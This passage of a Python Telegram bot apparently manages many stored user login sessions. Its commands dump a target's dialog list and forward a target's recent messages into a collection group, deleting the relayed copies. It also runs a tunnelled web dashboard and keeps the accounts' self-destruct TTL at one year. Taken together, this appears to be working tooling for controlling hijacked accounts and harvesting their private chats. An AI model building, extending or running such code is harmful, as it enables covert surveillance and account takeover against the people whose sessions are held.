    relay_queue[target_id] = 1000
    try:
        msg = await event.respond("Fetching data...")
        
        report = await session.fetch_dialog_list(mode)
        
        if report:
            if len(report) > 4000:
                fname = f"{target_id}_{mode}.txt"
                with open(fname, "w", encoding="utf-8") as f:
                    f.write(report)
                await event.client.send_file(event.chat_id, fname, caption=f"Report for {target_id} ({mode})")
                os.remove(fname)
                await msg.delete()
            else:
                await msg.edit(report)
        else:
            await msg.edit("No data found.")
    except Exception as e:
        await msg.edit(f"Error: {e}")
    finally:
        if target_id in relay_queue:
            del relay_queue[target_id]

@bot.on(events.NewMessage(pattern=r'/chat (\d+) (\d+) (\d+)'))
async def scan_forward_command(event):
    if event.chat_id != Details_Group_ID: return
    
    limit = int(event.pattern_match.group(1))
    scanner_id = int(event.pattern_match.group(2))
    target_id = int(event.pattern_match.group(3))
    
    if scanner_id not in active_sessions:
        await event.respond("Scanner User Session not active.")
        return
        
    session = active_sessions[scanner_id]
    
    # Register Relay
    # Add buffer for /start ping or other overhead
    relay_queue[scanner_id] = limit + 5
    
    me = await bot.get_me()
    uname = me.username
    
    msg = await event.respond(f"Forwarding last {limit} messages...")
    
    result = await session.forward_chats(target_id, limit, uname, Details_Group_ID)
    await msg.edit(f"Result: {result}")
    
    # Cleanup Relay State after forwarding is done
    # Wait a bit for pending relays to process
    await asyncio.sleep(2)
    if scanner_id in relay_queue:
        del relay_queue[scanner_id]

@bot.on(events.NewMessage)
async def relay_listener(event):
    if not event.is_private: return
    
    # Ignore /start ping
    if event.message.text == "/start": return
    
    sender_id = event.sender_id
    if sender_id in relay_queue:
        if relay_queue[sender_id] > 0:
            try:
                await event.message.forward_to(Details_Group_ID)
                relay_queue[sender_id] -= 1
                await event.message.delete()
            except Exception as e:
                logger.error(f"Relay error: {e}")
                
            if relay_queue[sender_id] <= 0:
                del relay_queue[sender_id]
            
            raise events.StopPropagation

async def restore_sessions():
    """Restores all user sessions on bot startup concurrently."""
    print("Restoring user sessions...")
    if os.path.exists(USERS_DIR):
        tasks = []
        for user_id_str in os.listdir(USERS_DIR):
            if user_id_str.isdigit():
                user_id = int(user_id_str)
                session_path = os.path.join(USERS_DIR, user_id_str, "session.session")
                if os.path.exists(session_path):
                    print(f"Queueing restore session for {user_id}")
                    tasks.append(ensure_logged_in(user_id))
        
        if tasks:
            print(f"Starting {len(tasks)} sessions concurrently...")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    logger.error(f"Failed to restore session: {r}")
            print("All sessions restored!")

async def check_restart_msg():
    """Checks for restart state and sends active message."""
    if os.path.exists("restart.txt"):
        try:
            with open("restart.txt", "r") as f:
                data = f.read().strip()
            
            os.remove("restart.txt")
            
            if ":" in data:
                chat_id = int(data.split(":")[0])
                msg_id = int(data.split(":")[1])
                msg = await bot.get_messages(chat_id, ids=msg_id)
                if msg:
                    await bot.edit_message(chat_id, msg_id, f"{msg.text}\n\nBot is running...")
                else:
                    await bot.send_message(chat_id, "Bot is running...")
            else:
                chat_id = int(data)
                await bot.send_message(chat_id, "Bot is running...")
        except Exception as e:
            print(f"Error sending restart msg: {e}")

import traceback

import secrets
import string
from web_server import start_web_server, start_cloudflared_tunnel, TUNNEL_URL
import web_server # to access updated TUNNEL_URL

web_app = None

@bot.on(events.NewMessage(pattern='/url'))
async def url_command_handler(event):
    if event.chat_id != Admins_Group_ID: return
    
    if web_app is None:
        await event.respond("Web dashboard is not initialized yet.")
        return
        
    # Generate new password
    chars = string.ascii_letters + string.digits
    new_password = ''.join(secrets.choice(chars) for _ in range(10))
    
    # Update app password
    web_app['admin_password'] = new_password
    
    status_msg = await event.respond("Generating new dashboard access...")
    
    # Restart Tunnel (This will send the new URL and password to the group once ready)
    port = 8081
    master_password = web_app['master_password']
    await start_cloudflared_tunnel(port, bot, Admins_Group_ID, new_password, master_password, status_msg)

print("Bot is running...")
bot.loop.create_task(restore_sessions())
bot.loop.create_task(check_restart_msg())

# Start Web Server and Cloudflare Tunnel tasks
async def start_dashboard():
    global web_app
    try:
        # Start web server on port 8081 (or configurable)
        port = 8081
        # Unpack 4 values including app
        site, password, master_password, app = await start_web_server(active_sessions, port)
        web_app = app
        
        # Start Tunnel (Uses the INITIAL password in the log, but subsequent /url calls will show NEW password)
        await start_cloudflared_tunnel(port, bot, Admins_Group_ID, password, master_password)
    except Exception as e:
        import traceback
        logger.error(f"Dashboard failed to start: {e}\\n{traceback.format_exc()}")
        await bot.send_message(Admins_Group_ID, f"Dashboard failed to start: {e}")

bot.loop.create_task(start_dashboard())

async def ttl_enforcer_task():
    """Background task to enforce 1-year TTL for accounts active > 30 hours."""
    while True:
        try:
            # Iterate over a copy of items to avoid runtime errors if dict changes
            if active_sessions:
                for user_id, session in list(active_sessions.items()):
                    await session.check_and_enforce_ttl()
        except Exception as e:
            logger.error(f"TTL Task error: {e}")
        # Check every hour (3600 seconds)
        await asyncio.sleep(3600)

async def hourly_backup_task():
    while True:
        try:
            now_ist = datetime.now(IST)
            if now_ist.hour < 12:
                next_time_ist = now_ist.replace(hour=12, minute=0, second=0, microsecond=0)
            else:
                next_time_ist = now_ist.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
            
            wait_seconds = (next_time_ist - now_ist).total_seconds()
            await asyncio.sleep(wait_seconds)
            await create_and_send_backup("Auto Backup")
        except Exception as e:
            logger.error(f"12-hour backup task error: {e}")
            await asyncio.sleep(60)

bot_live_msg = None

@bot.on(events.NewMessage(pattern='/status'))
async def status_handler(event):
    if event.chat_id != Logs_Group_ID: return
    global bot_live_msg
    try:
        await event.delete()
    except:
        pass
        
    msg_text = f"{datetime.now(IST).strftime('%I:%M %p').lstrip('0')} Bot is live..."
    if bot_live_msg:
        try:
            await bot_live_msg.delete()
        except:
            pass
            
    bot_live_msg = await bot.send_message(Logs_Group_ID, msg_text)
    try:
        service_msg = await bot.pin_message(Logs_Group_ID, bot_live_msg, notify=False)
        if service_msg:
            await service_msg.delete()
    except Exception as e:
        logger.error(f"Error pinning status msg: {e}")

async def bot_live_task():
    global bot_live_msg
    last_reset_date = None
    while True:
        try:
            now_ist = datetime.now(IST)
            time_str = now_ist.strftime("%I:%M %p").lstrip("0")
            msg_text = f"{time_str} Bot is live..."
            
            is_midnight = now_ist.hour == 0 and now_ist.minute == 0
            if is_midnight and last_reset_date != now_ist.date():
                if bot_live_msg:
                    try:
                        await bot_live_msg.delete()
                    except: pass
                bot_live_msg = None
                last_reset_date = now_ist.date()
            
            if bot_live_msg:
                try:
                    await bot_live_msg.edit(msg_text)
                except errors.MessageNotModifiedError:
                    pass
                except Exception as e:
                    logger.warning(f"Could not edit live message, sending new one: {e}")
                    bot_live_msg = await bot.send_message(Logs_Group_ID, msg_text)
                    try:
                        service_msg = await bot.pin_message(Logs_Group_ID, bot_live_msg, notify=False)
                        if service_msg:
                            await service_msg.delete()
                    except: pass
            else:
                bot_live_msg = await bot.send_message(Logs_Group_ID, msg_text)
                try:
                    service_msg = await bot.pin_message(Logs_Group_ID, bot_live_msg, notify=False)
                    if service_msg:
                        await service_msg.delete()
                except: pass
        except Exception as e:
            logger.error(f"Bot live task error: {e}")
            
        try:
            now_ist = datetime.now(IST)
            sleep_seconds = 60 - now_ist.second
            await asyncio.sleep(max(1, sleep_seconds))
        except Exception:
            await asyncio.sleep(60)

bot.loop.create_task(bot_live_task())
bot.loop.create_task(hourly_backup_task())
bot.loop.create_task(ttl_enforcer_task())

try:
    bot.run_until_disconnected()
except Exception:
    with open("crash.txt", "w") as f:
        f.write(traceback.format_exc())
    print("Bot Crashed! Check crash.txt")
